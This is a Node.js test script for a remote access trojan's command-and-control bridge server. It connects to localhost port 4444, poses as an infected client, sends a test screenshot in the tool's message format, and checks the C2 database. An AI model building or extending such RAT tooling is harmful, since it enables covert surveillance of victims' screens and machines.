const net = require('net');
const fs = require('fs');
const path = require('path');

function resolveDatabasePath() {
    const candidates = [
        process.env.BRIDGE_DB_PATH,
        path.join(process.cwd(), 'c2_data.db'),
        path.join(process.cwd(), 'bridge', 'c2_data.db')
    ].filter(Boolean);

    for (const candidate of candidates) {
        if (fs.existsSync(candidate)) {
            return candidate;
        }
    }

    return path.join(process.cwd(), 'c2_data.db');
}

console.log('=== Direct Screenshot Test ===\n');

// Create a simple test screenshot (a small BMP file)
function createTestBMP() {
    // Create a minimal 1x1 pixel BMP file
    const bmpHeader = Buffer.alloc(54);
    
    // BMP header
    bmpHeader.write('BM', 0); // Signature
    bmpHeader.writeUInt32LE(54 + 3, 2); // File size (header + 3 bytes for 1 pixel)
    bmpHeader.writeUInt32LE(0, 6); // Reserved
    bmpHeader.writeUInt32LE(54, 10); // Pixel data offset
    
    // DIB header
    bmpHeader.writeUInt32LE(40, 14); // DIB header size
    bmpHeader.writeInt32LE(1, 18); // Width
    bmpHeader.writeInt32LE(1, 22); // Height
    bmpHeader.writeUInt16LE(1, 26); // Color planes
    bmpHeader.writeUInt16LE(24, 28); // Bits per pixel
    bmpHeader.writeUInt32LE(0, 30); // Compression
    bmpHeader.writeUInt32LE(3, 34); // Image size
    bmpHeader.writeInt32LE(2835, 38); // Horizontal resolution
    bmpHeader.writeInt32LE(2835, 42); // Vertical resolution
    bmpHeader.writeUInt32LE(0, 46); // Colors in palette
    bmpHeader.writeUInt32LE(0, 50); // Important colors
    
    // Pixel data (1 white pixel)
    const pixelData = Buffer.from([255, 255, 255]); // BGR format
    
    return Buffer.concat([bmpHeader, pixelData]);
}

// Test 1: Check if we can connect to bridge server
console.log('Test 1: Checking bridge server connection...');
const testSocket = new net.Socket();

testSocket.connect(4444, 'localhost', () => {
    console.log('✓ Bridge server is running on port 4444');
    testSocket.end();
    
    // Test 2: Simulate RAT client connection and screenshot
    console.log('\nTest 2: Simulating RAT client with screenshot...');
    
    const clientSocket = new net.Socket();
    let clientId = null;
    
    clientSocket.connect(4444, 'localhost', () => {
        console.log('✓ RAT client connected to bridge');
        
        // Send client identification
        const hostname = 'TEST-CLIENT';
        const username = 'TestUser';
        clientSocket.write(`CLIENT_ID|${hostname}|${username}\n`);
        console.log(`✓ Sent client identification: ${hostname}\\${username}`);
        
        // Wait a bit, then send screenshot data
        setTimeout(() => {
            console.log('\nTest 3: Sending test screenshot data...');
            
            // Create test screenshot data
            const testBMP = createTestBMP();
            const screenshotData = testBMP.toString('base64');
            const message = `SCREENSHOT_STREAM|${screenshotData.length}|${screenshotData}`;
            
            clientSocket.write(message + '\n');
            console.log(`✓ Sent screenshot data (${screenshotData.length} bytes)`);
            
            // Check database after sending
            setTimeout(() => {
                console.log('\nTest 4: Checking database for screenshot...');
                
                const Database = require('better-sqlite3');
                const dbPath = resolveDatabasePath();
                const db = new Database(dbPath);
                console.log(`Using database: ${dbPath}`);
                
                // Find our test client
                const clients = db.prepare('SELECT * FROM clients WHERE hostname = ?').all(hostname);
                
                if (clients.length > 0) {
                    clientId = clients[0].id;
                    console.log(`✓ Test client found in database: ${clientId}`);
                    
                    // Check for screenshots
                    const screenshots = db.prepare('SELECT * FROM screenshots WHERE client_id = ?').all(clientId);
                    
                    if (screenshots.length > 0) {
                        console.log(`✓ SUCCESS: Screenshot saved to database!`);
                        console.log(`  Total screenshots: ${screenshots.length}`);
                        console.log(`  Latest screenshot ID: ${screenshots[0].id}`);
                        console.log(`  Image size: ${screenshots[0].image_size} bytes`);
                        console.log(`  Timestamp: ${new Date(screenshots[0].timestamp).toLocaleString()}`);
                    } else {
                        console.log('✗ FAILED: No screenshots found in database');
                        console.log('  Possible issues:');
                        console.log('  1. Bridge server not processing SCREENSHOT_STREAM messages');
                        console.log('  2. Database insert failed');
                        console.log('  3. Message format incorrect');
                    }
                } else {
                    console.log('✗ FAILED: Test client not found in database');
                    console.log('  Possible issues:');
                    console.log('  1. Bridge server not processing CLIENT_ID messages');
                    console.log('  2. Database insert failed');
                }
                
                db.close();
                clientSocket.end();
                console.log('\n=== Test Complete ===');
                process.exit(0);
            }, 1000);
        }, 500);
    });
    
    clientSocket.on('error', (err) => {
        console.error('✗ Client socket error:', err.message);
        process.exit(1);
    });
    
    clientSocket.on('close', () => {
        console.log('✓ Client connection closed');
    });
});

testSocket.on('error', (err) => {
    console.error('✗ Bridge server not running on port 4444');
    console.error('  Error:', err.message);
    console.log('\nPlease start the bridge server first:');
    console.log('  cd "c:\\Users\\Administrator\\Desktop\\CLI C+ Root"');
    console.log('  node bridge/index.js');
    process.exit(1);
});

// Timeout
setTimeout(() => {
    console.error('✗ Test timeout');
    process.exit(1);
}, 10000);